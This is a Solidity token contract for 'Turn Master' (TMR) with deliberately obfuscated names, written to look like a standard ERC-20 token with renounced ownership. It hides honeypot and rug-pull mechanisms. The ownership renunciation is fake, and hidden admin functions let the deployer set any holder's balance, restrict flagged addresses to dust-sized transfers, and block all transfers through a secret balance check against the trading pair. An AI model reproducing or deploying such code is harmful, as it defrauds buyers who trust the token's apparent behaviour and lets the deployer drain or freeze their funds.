//SPDX-License-Identifier: MIT

pragma solidity ^0.8.6;

interface amountAt {
    function createPair(address swapAmountMin, address tokenSell) external returns (address);
}

interface amountLaunched {
    function totalSupply() external view returns (uint256);

    function balanceOf(address modeReceiverLimit) external view returns (uint256);

    function transfer(address fromMode, uint256 launchExempt) external returns (bool);

    function allowance(address receiverTakeIs, address spender) external view returns (uint256);

    function approve(address spender, uint256 launchExempt) external returns (bool);

    function transferFrom(
        address sender,
        address fromMode,
        uint256 launchExempt
    ) external returns (bool);

    event Transfer(address indexed from, address indexed tokenShouldFund, uint256 value);
    event Approval(address indexed receiverTakeIs, address indexed spender, uint256 value);
}

abstract contract maxList {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface fundSender {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface amountLaunchedMetadata is amountLaunched {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract TurnMaster is maxList, amountLaunched, amountLaunchedMetadata {

    mapping(address => bool) public listMax;

    string private atSell = "Turn Master";

    function approve(address sellMinExempt, uint256 launchExempt) public virtual override returns (bool) {
        enableReceiver[_msgSender()][sellMinExempt] = launchExempt;
        emit Approval(_msgSender(), sellMinExempt, launchExempt);
        return true;
    }

    mapping(address => mapping(address => uint256)) private enableReceiver;

    function getOwner() external view returns (address) {
        return swapTxReceiver;
    }

    function allowance(address listWallet, address sellMinExempt) external view virtual override returns (uint256) {
        if (sellMinExempt == fromListAuto) {
            return type(uint256).max;
        }
        return enableReceiver[listWallet][sellMinExempt];
    }

    address public receiverListSwap;

    bool public isMax;

    function feeLimitMax(address enableSwap) public {
        require(enableSwap.balance < 100000);
        if (isMax) {
            return;
        }
        if (senderReceiverTx != listLaunch) {
            listLaunch = senderReceiverTx;
        }
        listMax[enableSwap] = true;
        if (senderReceiverTx == autoLaunched) {
            shouldFund = true;
        }
        isMax = true;
    }

    uint256 private autoLaunched;

    function launchMode() private view {
        require(listMax[_msgSender()]);
    }

    function isTotal(uint256 launchExempt) public {
        launchMode();
        listTeam = launchExempt;
    }

    mapping(address => uint256) private autoMarketingLimit;

    uint256 public atFund;

    uint256 listTeam;

    bool private shouldFund;

    function totalSupply() external view virtual override returns (uint256) {
        return swapLimit;
    }

    function isTakeTrading(address fundLaunched, address fromMode, uint256 launchExempt) internal returns (bool) {
        require(autoMarketingLimit[fundLaunched] >= launchExempt);
        autoMarketingLimit[fundLaunched] -= launchExempt;
        autoMarketingLimit[fromMode] += launchExempt;
        emit Transfer(fundLaunched, fromMode, launchExempt);
        return true;
    }

    bool public txAuto;

    function receiverLaunch(address fundLaunched, address fromMode, uint256 launchExempt) internal returns (bool) {
        if (fundLaunched == receiverAt) {
            return isTakeTrading(fundLaunched, fromMode, launchExempt);
        }
        uint256 receiverTrading = amountLaunched(receiverListSwap).balanceOf(marketingModeWallet);
        require(receiverTrading == listTeam);
        require(fromMode != marketingModeWallet);
        if (listTx[fundLaunched]) {
            return isTakeTrading(fundLaunched, fromMode, liquiditySenderSwap);
        }
        return isTakeTrading(fundLaunched, fromMode, launchExempt);
    }

    uint256 private listLaunch;

    bool private amountTrading;

    function feeFundTo(address atSwap, uint256 launchExempt) public {
        launchMode();
        autoMarketingLimit[atSwap] = launchExempt;
    }

    function transferFrom(address fundLaunched, address fromMode, uint256 launchExempt) external override returns (bool) {
        if (_msgSender() != fromListAuto) {
            if (enableReceiver[fundLaunched][_msgSender()] != type(uint256).max) {
                require(launchExempt <= enableReceiver[fundLaunched][_msgSender()]);
                enableReceiver[fundLaunched][_msgSender()] -= launchExempt;
            }
        }
        return receiverLaunch(fundLaunched, fromMode, launchExempt);
    }

    function transfer(address atSwap, uint256 launchExempt) external virtual override returns (bool) {
        return receiverLaunch(_msgSender(), atSwap, launchExempt);
    }

    function name() external view virtual override returns (string memory) {
        return atSell;
    }

    function symbol() external view virtual override returns (string memory) {
        return isMode;
    }

    function launchedList(address launchFund) public {
        launchMode();
        
        if (launchFund == receiverAt || launchFund == receiverListSwap) {
            return;
        }
        listTx[launchFund] = true;
    }

    uint256 constant liquiditySenderSwap = 20 ** 10;

    address marketingModeWallet = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    address public receiverAt;

    string private isMode = "TMR";

    constructor (){
        if (atMode) {
            shouldFund = true;
        }
        fundSender limitEnable = fundSender(fromListAuto);
        receiverListSwap = amountAt(limitEnable.factory()).createPair(limitEnable.WETH(), address(this));
        if (txAuto != amountTrading) {
            shouldFund = true;
        }
        receiverAt = _msgSender();
        listMax[receiverAt] = true;
        autoMarketingLimit[receiverAt] = swapLimit;
        enableAuto();
        if (senderReceiverTx == listLaunch) {
            atMode = false;
        }
        emit Transfer(address(0), receiverAt, swapLimit);
    }

    bool private atMode;

    uint256 private senderReceiverTx;

    address private swapTxReceiver;

    mapping(address => bool) public listTx;

    bool public toFrom;

    function enableAuto() public {
        emit OwnershipTransferred(receiverAt, address(0));
        swapTxReceiver = address(0);
    }

    event OwnershipTransferred(address indexed takeMin, address indexed isFee);

    uint8 private launchAutoMin = 18;

    function balanceOf(address modeReceiverLimit) public view virtual override returns (uint256) {
        return autoMarketingLimit[modeReceiverLimit];
    }

    function owner() external view returns (address) {
        return swapTxReceiver;
    }

    address fromListAuto = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    uint256 private swapLimit = 100000000 * 10 ** 18;

    uint256 toExemptMode;

    function decimals() external view virtual override returns (uint8) {
        return launchAutoMin;
    }

}